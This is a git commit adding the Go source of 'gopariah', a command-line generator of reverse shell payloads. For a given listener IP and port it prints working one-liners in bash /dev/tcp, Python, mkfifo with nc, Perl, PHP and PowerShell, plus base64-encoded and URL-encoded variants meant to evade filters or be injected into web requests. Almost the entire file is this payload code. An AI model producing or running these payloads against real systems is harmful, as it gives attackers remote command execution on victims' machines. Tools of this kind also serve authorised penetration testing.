ba85aa5b274b4e99dc4fd7383d591fb140183214
Julio A <52619625+julio-cfa@users.noreply.github.com>
2023-08-20 21:56:41 +0200

    Added source code to repo

---
+++ go.mod
@@ -0,0 +1,3 @@
+module gopariah
+
+go 1.20
---
+++ main.go
@@ -0,0 +1,161 @@
+package main
+
+import (
+	"encoding/base64"
+	"fmt"
+	"net/url"
+	"os"
+)
+
+func main() {
+
+	shell_type := "/bin/bash"
+
+	// Check if there are enough arguments
+	args := os.Args[0:]
+
+	if len(args) < 2 {
+		fmt.Println("No arguments have been identified. Please add '-h' or '--help' for help.")
+		os.Exit(0)
+	}
+
+	if (os.Args[1] == "-h" || os.Args[1] == "--help") && len(args) < 3 {
+		helpText := `Usage: ./gopariah <revshell-type> <lhost> <lport> 
+
+> Available revshells: 		
+  bash
+  bash_urlencode
+  python
+  python3
+  python_b64
+  python3_b64
+  python_urlencode
+  python3_urlencode
+  mkfifo
+  mkfifo_urlencode
+  perl
+  perl_b64
+  perl_urlencode
+  php
+  php_b64
+  php_urlencode
+  powershell
+  powershell_b64
+  powershell_urlencode`
+
+		fmt.Println(helpText)
+	}
+
+	if len(args) == 3 {
+		fmt.Println("An argument is missing. Remember that you have to supply local ip and local port.")
+		os.Exit(0)
+	}
+
+	if os.Args[1] == "bash" {
+		payload := fmt.Sprintf("%s -i >& /dev/tcp/%s/%s 0>&1", shell_type, os.Args[2], os.Args[3])
+		fmt.Println(payload)
+	}
+
+	if os.Args[1] == "bash_urlencode" {
+		payload := fmt.Sprintf("%s -i >& /dev/tcp/%s/%s 0>&1", shell_type, os.Args[2], os.Args[3])
+		fmt.Println(url.QueryEscape(payload))
+	}
+
+	if os.Args[1] == "python" {
+		payload := fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
+		fmt.Println(payload)
+	}
+
+	if os.Args[1] == "python3" {
+		payload := fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
+		fmt.Println(payload)
+	}
+
+	if os.Args[1] == "python_b64" {
+		payload := fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
+		input := []byte(payload)
+		encoded := base64.StdEncoding.EncodeToString(input)
+		fmt.Println("echo -n " + encoded + " | base64 -d | bash")
+	}
+
+	if os.Args[1] == "python3_b64" {
+		payload := fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
+		input := []byte(payload)
+		encoded := base64.StdEncoding.EncodeToString(input)
+		fmt.Println("echo -n " + encoded + " | base64 -d | bash")
+	}
+
+	if os.Args[1] == "python_urlencode" {
+		payload := fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
+		fmt.Println(url.QueryEscape(payload))
+	}
+
+	if os.Args[1] == "python3_urlencode" {
+		payload := fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"%s\")'", os.Args[2], os.Args[3], shell_type)
+		fmt.Println(url.QueryEscape(payload))
+	}
+
+	if os.Args[1] == "mkfifo" {
+		payload := fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc %s %s >/tmp/f", shell_type, os.Args[2], os.Args[3])
+		fmt.Println(payload)
+	}
+
+	if os.Args[1] == "mkfifo_urlencode" {
+		payload := fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc %s %s >/tmp/f", shell_type, os.Args[2], os.Args[3])
+		fmt.Println(url.QueryEscape(payload))
+	}
+
+	if os.Args[1] == "perl" {
+		payload := fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", os.Args[2], os.Args[3], shell_type)
+		fmt.Println(payload)
+	}
+
+	if os.Args[1] == "perl_b64" {
+		payload := fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", os.Args[2], os.Args[3], shell_type)
+		input := []byte(payload)
+		encoded := base64.StdEncoding.EncodeToString(input)
+		fmt.Println("echo -n " + encoded + " | base64 -d | bash")
+	}
+
+	if os.Args[1] == "perl_urlencode" {
+		payload := fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", os.Args[2], os.Args[3], shell_type)
+		fmt.Println(url.QueryEscape(payload))
+	}
+
+	if os.Args[1] == "php" {
+		payload := fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"%s <&3 >&3 2>&3\");'", os.Args[2], os.Args[3], shell_type)
+		fmt.Println(payload)
+	}
+
+	if os.Args[1] == "php_b64" {
+		payload := fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"%s <&3 >&3 2>&3\");'", os.Args[2], os.Args[3], shell_type)
+		input := []byte(payload)
+		encoded := base64.StdEncoding.EncodeToString(input)
+		fmt.Println("echo -n " + encoded + " | base64 -d | bash")
+	}
+
+	if os.Args[1] == "php_urlencode" {
+		payload := fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"%s <&3 >&3 2>&3\");'", os.Args[2], os.Args[3], shell_type)
+		fmt.Println(url.QueryEscape(payload))
+	}
+
+	if os.Args[1] == "powershell" {
+		payload := fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", os.Args[2], os.Args[3])
+		fmt.Println(payload)
+	}
+
+	if os.Args[1] == "powershell_b64" {
+		payload := fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", os.Args[2], os.Args[3])
+		input := []byte(payload)
+		encoded := base64.StdEncoding.EncodeToString(input)
+		fmt.Println("powershell.exe -e " + encoded)
+	}
+
+	if os.Args[1] == "powershell_urlencode" {
+		payload := fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", os.Args[2], os.Args[3])
+		fmt.Println(url.QueryEscape(payload))
+	}
+
+}
+
+//func help()
